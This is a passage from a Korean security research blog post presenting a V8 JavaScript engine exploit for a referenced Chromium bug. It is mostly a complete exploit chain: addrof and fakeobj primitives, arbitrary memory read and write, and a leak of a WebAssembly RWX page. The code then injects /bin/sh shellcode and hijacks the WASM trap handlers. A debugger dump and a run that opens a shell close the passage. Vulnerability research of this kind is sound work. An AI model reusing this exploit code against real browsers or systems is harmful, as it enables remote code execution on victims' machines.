<span class="nt">yee</span> <span class="err">=</span> <span class="nt">trigger</span><span class="err">()[0];</span>
<span class="nt">yoff</span> <span class="err">=</span> <span class="err">0;</span>

<span class="nt">function</span> <span class="nt">addrof</span><span class="err">(</span><span class="nt">o</span><span class="err">)</span> <span class="err">{</span>
    <span class="nt">yee2</span><span class="err">[0]</span> <span class="err">=</span> <span class="nt">o</span><span class="err">;</span>
    <span class="nt">yee2</span><span class="err">[1]</span> <span class="err">=</span> <span class="nt">o</span><span class="err">;</span>
    <span class="nt">return</span> <span class="nt">yee</span><span class="err">[</span><span class="nt">yoff</span><span class="err">]</span><span class="p">.</span><span class="nt">f2i</span><span class="err">()</span> <span class="p">&gt;</span><span class="err">&gt;</span> 32n;
}

function fakeobj(o) <span class="si">{</span>
    <span class="nx">o</span> <span class="o">=</span> <span class="nx">o</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
    <span class="nx">yee</span><span class="p">[</span><span class="nx">yoff</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">o</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span> <span class="o">|</span> <span class="nx">o</span><span class="p">).</span><span class="nx">i2f</span><span class="p">();</span>
    <span class="k">return</span> <span class="nx">yee2</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="si">}</span>

function main() <span class="si">{</span>

    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="nx">i</span><span class="o">-=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="nx">yee</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">f2i</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">yoff</span> <span class="o">=</span> <span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">((</span><span class="nx">yee</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">f2i</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">yoff</span> <span class="o">=</span> <span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">yoff</span><span class="dl">"</span><span class="p">,</span> <span class="nx">yoff</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">];</span>

    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">WASM start</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">]);</span>
    <span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>

    <span class="c1">// found a</span>
    <span class="nx">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">-</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">yee</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="nx">n</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">offset</span><span class="dl">"</span><span class="p">,</span> <span class="nx">offset</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
        <span class="nx">yee</span><span class="p">[</span><span class="nx">offset</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">r</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span> <span class="o">|</span> <span class="nx">r</span><span class="p">).</span><span class="nx">i2f</span><span class="p">();</span>
        <span class="k">return</span>  <span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">f2i</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">write64</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span><span class="o">-</span><span class="mh">0x8</span><span class="nx">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
        <span class="nx">yee</span><span class="p">[</span><span class="nx">offset</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">r</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span> <span class="o">|</span> <span class="nx">r</span><span class="p">).</span><span class="nx">i2f</span><span class="p">();</span>
        <span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">i2f</span><span class="p">();</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// leak rwx address</span>
    <span class="kd">let</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">wasm_instance_addr</span><span class="dl">"</span><span class="p">,</span> <span class="nx">wasm_instance_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
    <span class="kd">let</span> <span class="nx">rwx</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">wasm_instance_addr</span><span class="o">+</span><span class="mh">0x68</span><span class="nx">n</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">rwx</span><span class="dl">"</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>

    <span class="c1">// write</span>
    <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">arr_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
    <span class="nx">write64</span><span class="p">(</span><span class="nx">arr_addr</span><span class="o">+</span><span class="mh">0x14</span><span class="nx">n</span><span class="p">,</span> <span class="nx">rwx</span><span class="p">);</span>

    <span class="c1">// alloc</span>
    <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0xb848686a</span><span class="p">,</span> <span class="mh">0x6e69622f</span><span class="p">,</span> <span class="mh">0x732f2f2f</span><span class="p">,</span> <span class="mh">0xe7894850</span><span class="p">,</span> <span class="mh">0x1697268</span><span class="p">,</span> <span class="mh">0x24348101</span><span class="p">,</span> <span class="mh">0x1010101</span><span class="p">,</span> <span class="mh">0x6a56f631</span><span class="p">,</span> <span class="mh">0x1485e08</span><span class="p">,</span> <span class="mh">0x894856e6</span><span class="p">,</span> <span class="mh">0x6ad231e6</span><span class="p">,</span> <span class="mh">0x50f583b</span><span class="p">];</span>
    <span class="kd">let</span> <span class="nx">z</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">-=-</span><span class="mi">1</span><span class="p">)</span>
        <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>

    <span class="kd">let</span> <span class="nx">zz</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="nx">i</span><span class="o">-=-</span><span class="mi">1</span><span class="p">)</span>
        <span class="nx">zz</span><span class="p">[</span><span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span> <span class="o">+</span> <span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rwx</span><span class="p">;</span>

    <span class="c1">// fail wasm exception</span>
    <span class="nx">f</span><span class="p">();</span>
<span class="si">}</span>

setTimeout(main, 500);
</code></pre></div></div>

<p>address compression이 적용된 v8을 익스하는건 처음이라 “이렇게 하면 된다~” 라는걸 따라해서 코드를 만들어 봤다. webassembly으로 <code class="highlighter-rouge">rwx</code>를 만들면 에러 핸들링 하는 함수들의 포인터가 <code class="highlighter-rouge">rwx</code>영역의 시작지점 부근에 쌓이길래 이거로 트리거 했다.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x000029024a482048│+0x0048: 0x00007ffff61d4da0  →  &lt;Builtins_ThrowWasmTrapUnreachable+0&gt; push rbp
0x000029024a482050│+0x0050: 0x90660000000225ff
0x000029024a482058│+0x0058: 0x00007ffff61d4f00  →  &lt;Builtins_ThrowWasmTrapMemOutOfBounds+0&gt; push rbp
0x000029024a482060│+0x0060: 0x90660000000225ff
0x000029024a482068│+0x0068: 0x00007ffff61d5060  →  &lt;Builtins_ThrowWasmTrapUnalignedAccess+0&gt; push rbp
0x000029024a482070│+0x0070: 0x90660000000225ff
0x000029024a482078│+0x0078: 0x00007ffff61d51c0  →  &lt;Builtins_ThrowWasmTrapDivByZero+0&gt; push rbp
0x000029024a482080│+0x0080: 0x90660000000225ff
0x000029024a482088│+0x0088: 0x00007ffff61d5320  →  &lt;Builtins_ThrowWasmTrapDivUnrepresentable+0&gt; push rbp
0x000029024a482090│+0x0090: 0x90660000000225ff
<span class="o">[</span>...]
0x000029024a482218│+0x0218: 0x00007ffff61fc340  →  &lt;Builtins_DoubleToI+0&gt; push rcx
0x000029024a482220│+0x0220: 0x90660000000225ff
0x000029024a482228│+0x0228: 0x00007ffff5fdfec0  →  &lt;Builtins_I32PairToBigInt+0&gt; int3 
0x000029024a482230│+0x0230: 0x90660000000225ff
0x000029024a482238│+0x0238: 0x00007ffff5fdfce0  →  &lt;Builtins_I64ToBigInt+0&gt; push rbp
0x000029024a482240│+0x0240: 0x90660000000225ff
0x000029024a482248│+0x0248: 0x00007ffff5fbb4e0  →  &lt;Builtins_RecordWrite+0&gt; push rbp
0x000029024a482250│+0x0250: 0x90660000000225ff
0x000029024a482258│+0x0258: 0x00007ffff5fdbf60  →  &lt;Builtins_ToNumber+0&gt; push rbp
</code></pre></div></div>

<p>이런 핸들러들이 쌓여있는데 여기를 내가 원하는 <code class="highlighter-rouge">rwx</code>로 덮어버리면 웹어셈 코드에서 해당 에러가 났을 때 그쪽으로 뛴다.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>임 ~/hdd/v8/v8/out/x64.release ./d8 ~/Workspace/b.js                                                                                                73f88b5f69
yoff 11
WASM start
offset 51
wasm_instance_addr 8211ed5
rwx 115abb56b000
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>wwwlk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>wwwlk<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>wwwlk<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,131<span class="o">(</span>lxd<span class="o">)</span>,132<span class="o">(</span>sambashare<span class="o">)</span>,133<span class="o">(</span>docker<span class="o">)</span>
<span class="nv">$ </span><span class="nb">pwd</span>
/hdd/v8/v8/out/x64.release
</code></pre></div></div>

<h1 id="reference">reference</h1>

<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">https://bugs.chromium.org/p/chromium/issues/detail?id=1051017</a></p>

<p><a href="https://lordofpwn.kr/cve-2019-8506-javascriptcore-exploit/">https://lordofpwn.kr/cve-2019-8506-javascriptcore-exploit/</a></p>

	</div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
	<a href="/2020-07-01/Android-Application-Dynamic-Analysis-in-Remote-Nox" class="left arrow">&#8592;</a>
  
  
	<a href="/2020-06-01/Web-En-Decode-Code" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>

    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-08-11 07:00:51 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
